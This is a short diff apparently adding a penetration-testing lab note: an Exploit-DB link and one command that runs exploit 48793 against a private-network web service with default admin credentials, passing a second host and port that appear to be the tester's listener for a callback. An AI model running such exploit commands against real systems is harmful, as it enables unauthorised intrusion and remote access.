@@ -1,0 +1,5 @@
+https://www.exploit-db.com/exploits/48793
+
+python 48793.py http://192.168.206.96:40443 admin admin 192.168.49.206 80
+
+
